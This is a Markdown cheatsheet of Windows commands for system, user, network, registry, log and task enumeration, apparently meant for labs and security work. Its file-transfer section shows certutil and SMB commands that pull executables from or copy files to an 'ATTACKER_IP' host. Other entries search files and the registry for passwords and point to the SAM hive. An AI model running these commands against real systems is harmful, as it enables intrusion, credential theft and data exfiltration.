# Windows Commands

---

## Executive Summary

This cheatsheet is a quick reference for Windows command-line enumeration, files, users, groups, processes, services, networking, registry, and logs.

Use it during labs, administration, troubleshooting, and security investigations.

## System Information

Show Windows version:

```cmd
ver
```

Detailed system information:

```cmd
systeminfo
```

Show hostname:

```cmd
hostname
```

Show current user:

```cmd
whoami
```

Show current user privileges:

```cmd
whoami /priv
```

Show current user groups:

```cmd
whoami /groups
```

Show environment variables:

```cmd
set
```

## Filesystem Navigation

Print current directory:

```cmd
cd
```

List files:

```cmd
dir
```

List hidden files:

```cmd
dir /a
```

Recursive directory listing:

```cmd
dir /s
```

Change directory:

```cmd
cd C:\Path\To\Folder
```

Show directory tree:

```cmd
tree /f /a
```

## File Viewing and Searching

View file contents:

```cmd
type file.txt
```

Search for text:

```cmd
findstr /si "password" *.txt
```

Search recursively:

```cmd
findstr /spin "password" *.*
```

Count lines:

```cmd
type file.txt | find /c /v ""
```

Find files by name:

```cmd
dir /s /b C:\*password*
```

## Users and Groups

List local users:

```cmd
net user
```

Show user details:

```cmd
net user USERNAME
```

List local groups:

```cmd
net localgroup
```

Show local administrators:

```cmd
net localgroup administrators
```

List domain users:

```cmd
net user /domain
```

List domain groups:

```cmd
net group /domain
```

Show domain group members:

```cmd
net group "Domain Admins" /domain
```

## Processes

List processes:

```cmd
tasklist
```

Show services inside processes:

```cmd
tasklist /svc
```

Verbose process list:

```cmd
tasklist /v
```

Kill process by name:

```cmd
taskkill /f /im PROCESS.exe
```

Kill process by PID:

```cmd
taskkill /f /pid PID
```

Show process command lines:

```cmd
wmic process get processid,parentprocessid,commandline
```

## Services

List services:

```cmd
sc query state= all
```

Query service:

```cmd
sc qc SERVICE_NAME
```

Start service:

```cmd
sc start SERVICE_NAME
```

Stop service:

```cmd
sc stop SERVICE_NAME
```

Show service processes:

```cmd
tasklist /svc
```

## Networking

Show IP configuration:

```cmd
ipconfig /all
```

Show DNS cache:

```cmd
ipconfig /displaydns
```

Show routing table:

```cmd
route print
```

Show ARP table:

```cmd
arp -a
```

Show active connections:

```cmd
netstat -ano
```

Show listening ports:

```cmd
netstat -ano | findstr LISTENING
```

Ping host:

```cmd
ping TARGET_IP
```

Trace route:

```cmd
tracert TARGET_IP
```

DNS lookup:

```cmd
nslookup example.com
```

## Shares and Sessions

List local shares:

```cmd
net share
```

List visible network hosts:

```cmd
net view
```

List domain hosts:

```cmd
net view /domain
```

List remote shares:

```cmd
net view \\TARGET_IP /all
```

Connect to share:

```cmd
net use Z: \\TARGET_IP\SHARE
```

Disconnect share:

```cmd
net use Z: /delete
```

Show active sessions:

```cmd
net session
```

## Registry

Query registry key:

```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion"
```

Search registry for password:

```cmd
reg query HKLM /f password /t REG_SZ /s
```

Add registry value:

```cmd
reg add "HKCU\Software\Test" /v Name /t REG_SZ /d Value /f
```

Delete registry value:

```cmd
reg delete "HKCU\Software\Test" /v Name /f
```

Important Run keys:

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

## Event Logs

List logs:

```cmd
wevtutil el
```

Query recent Security events:

```cmd
wevtutil qe Security /c:20 /rd:true /f:text
```

Query logon events:

```cmd
wevtutil qe Security /q:"*[System[(EventID=4624)]]" /c:20 /rd:true /f:text
```

Query failed logons:

```cmd
wevtutil qe Security /q:"*[System[(EventID=4625)]]" /c:20 /rd:true /f:text
```

## Scheduled Tasks

List scheduled tasks:

```cmd
schtasks /query /fo LIST /v
```

Query specific task:

```cmd
schtasks /query /tn TASK_NAME /fo LIST /v
```

Create task:

```cmd
schtasks /create /sc once /tn TASK_NAME /tr "C:\Path\file.exe" /st 23:59
```

Delete task:

```cmd
schtasks /delete /tn TASK_NAME /f
```

## File Transfer

Download with Certutil:

```cmd
certutil -urlcache -split -f http://ATTACKER_IP/file.exe file.exe
```

Copy from SMB share:

```cmd
copy \\ATTACKER_IP\share\file.exe C:\Users\Public\file.exe
```

Map SMB drive:

```cmd
net use Z: \\ATTACKER_IP\share /user:USERNAME PASSWORD
```

Copy file to share:

```cmd
copy file.txt Z:\
```

## Useful Paths

| Path | Purpose |
|---|---|
| `C:\Windows\System32\drivers\etc\hosts` | Hosts file |
| `C:\Windows\System32\config\SAM` | Local account database |
| `C:\Windows\System32\config\SYSTEM` | System registry hive |
| `C:\Windows\Temp\` | System temp directory |
| `C:\Users\<user>\AppData\Local\Temp\` | User temp directory |
| `C:\Users\Public\` | Public user directory |
| `C:\ProgramData\` | Shared application data |
| `%APPDATA%` | User roaming profile data |
| `%USERPROFILE%` | Current user profile |

## Notes

- Use `whoami /priv` and `whoami /groups` early during enumeration.
- `netstat -ano` gives PIDs; match them with `tasklist`.
- Registry searches can be noisy and slow.
- Some commands require administrator privileges.
- Event logs and command-line auditing are important defensive data sources.